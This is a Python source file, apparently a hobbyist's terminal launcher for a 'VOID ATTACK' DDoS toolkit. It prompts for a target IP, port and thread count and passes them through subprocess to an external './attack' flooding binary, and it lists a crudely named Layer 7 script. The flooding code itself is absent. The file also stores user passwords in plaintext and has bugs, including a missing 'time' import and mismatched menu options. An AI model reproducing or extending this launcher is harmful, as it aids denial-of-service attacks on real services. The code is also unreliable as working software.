from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel
from rich.table import Table
from rich.align import Align
from rich.text import Text
from pyfiglet import Figlet
from rich.style import Style
import json
import os
import subprocess
import logging
from rich.progress import Progress
from datetime import datetime

# ========== Configuration ==========
console = Console()
USERS_FILE = "users.json"
THEME = {
    "primary": Style(color="bright_red"),
    "secondary": Style(color="bright_yellow"),
    "highlight": Style(color="cyan", bold=True),
    "error": Style(color="bright_red", bold=True),
    "success": Style(color="bright_green", bold=True),
    "warning": Style(color="bright_yellow"),
}

# ========== Enhanced Banner ==========
def create_banner():
    """Create a gradient red banner"""
    figlet = Figlet(font='slant')
    banner = figlet.renderText("VOID ATTACK")
    
    # Create gradient effect
    gradient_banner = Text()
    colors = ["red", "bright_red", "dark_red", "red3"]
    for i, line in enumerate(banner.split('\n')):
        color = colors[i % len(colors)]
        gradient_banner.append(line + '\n', style=color)
    
    return Panel(
        gradient_banner,
        title="⚡ DDoS Attack Toolkit",
        border_style="bright_red",
        style="bright_white on black",
        subtitle=f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )

# ========== Improved User Management ==========
def login_or_register():
    """Enhanced login/register with validation"""
    console.print(Panel.fit(
        "[bold]🔐 Authentication System[/bold]",
        border_style="cyan",
        style="bright_white on black"
    ))
    
    users = {}
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, "r") as f:
                users = json.load(f)
        except Exception as e:
            console.print(f"[{THEME['error']}]Error loading users: {e}[/]")

    options = [
        {"name": "Login", "key": "1"},
        {"name": "Register", "key": "2"}
    ]
    
    console.print(Align.center(create_menu("Authentication", options)))
    choice = Prompt.ask("Select option", choices=["1", "2"], default="1")

    attempts = 0
    while attempts < 3:
        username = Prompt.ask("[cyan]🔹 Enter username[/cyan]")
        
        if choice == "2":
            if username in users:
                console.print(f"[{THEME['error']}]❌ Username already exists![/]")
                continue
            password = Prompt.ask("[cyan]🔹 Create password[/cyan]", password=True)
            users[username] = password
            with open(USERS_FILE, "w") as f:
                json.dump(users, f, indent=4)
            console.print(f"[{THEME['success']}]✅ Registered successfully![/]")
            return username
            
        elif username in users:
            password = Prompt.ask("[cyan]🔹 Enter password[/cyan]", password=True)
            if users[username] == password:
                console.print(f"[{THEME['success']}]✅ Login successful![/]")
                return username
            console.print(f"[{THEME['error']}]❌ Invalid password![/]")
        else:
            console.print(f"[{THEME['error']}]❌ User not found![/]")
        attempts += 1
    
    console.print(f"[{THEME['error']}]Too many failed attempts! Exiting...[/]")
    exit()

# ========== Menu Utilities ==========
def create_menu(title, options):
    """Create a rich menu table"""
    menu = Table(
        title=f"[bright_red]{title}[/bright_red]",
        border_style="bright_red",
        show_lines=True,
    )
    menu.add_column("Option", style="bright_cyan")
    menu.add_column("Description", style="yellow")
    for opt in options:
        menu.add_row(opt["key"], opt["name"])
    return menu

# ========== Attack Functions ==========
def launch_attack(attack_type):
    """Handle attack execution with progress"""
    attack_params = {
        "1": {"name": "Layer 4 Attack", "script": "./attack", "params": ["ip", "port", "threads"]},
        "2": {"name": "Layer 7 Soon", "script": "python3 rapist.py", "params": ["ip", "method"]},
    }
    
    params = {}
    for param in attack_params[attack_type]["params"]:
        params[param] = Prompt.ask(f"[cyan]Enter {param}[/cyan]") 

    with Progress() as progress:
        task = progress.add_task(f"[cyan]🚀 Launching {attack_params[attack_type]['name']}...", total=100)
        while not progress.finished:
            progress.update(task, advance=0.1)
            time.sleep(0.02)
            
    try:
        cmd = [attack_params[attack_type]["script"]] + list(params.values())
        subprocess.run(cmd, check=True)
        console.print(f"[{THEME['success']}]✅ Attack completed successfully![/]")
    except Exception as e:
        console.print(f"[{THEME['error']}]❌ Error: {e}[/]")

# ========== Main Menu ==========
def main_menu(username):
    """Enhanced main menu with better layout"""
    os.system("clear")
    console.print(Align.center(create_banner()))
    
    options = [
        {"name": "Layer 4 Attack", "key": "1"},
        {"name": "Layer 7 Soon", "key": "2"},
        {"name": "View Logs", "key": "3"},
        {"name": "Exit", "key": "4"}
    ]
    
    console.print(Panel.fit(
        f"[bold yellow]👤 User:[/bold yellow] [cyan]{username}[/cyan] | "
        f"[bold yellow]⏰ Time:[/bold yellow] [cyan]{datetime.now().strftime('%H:%M:%S')}[/cyan]",
        border_style="bright_red"
    ))
    
    console.print(Align.center(create_menu("Attack Methods", options)))
    
    choice = Prompt.ask("[cyan]🔹 Select option[/cyan]", choices=["1", "2", "3", "4"])
    
    if choice == "1":
        launch_attack("1")
    elif choice == "2":
        console.print("[yellow]📊 Log viewer coming in next version![/yellow]")
    elif choice == "3":
        console.print("[yellow]📊 Log viewer coming in next version![/yellow]")
    else:
        console.print("[bright_red]👋 Exiting... Goodbye![/bright_red]")
        exit()

# ========== Main Execution ==========
if __name__ == "__main__":
    try:
        user = login_or_register()
        while True:
            main_menu(user)
    except KeyboardInterrupt:
        console.print("\n[bold red]✗ Process interrupted! Exiting...[/bold red]")
        exit()
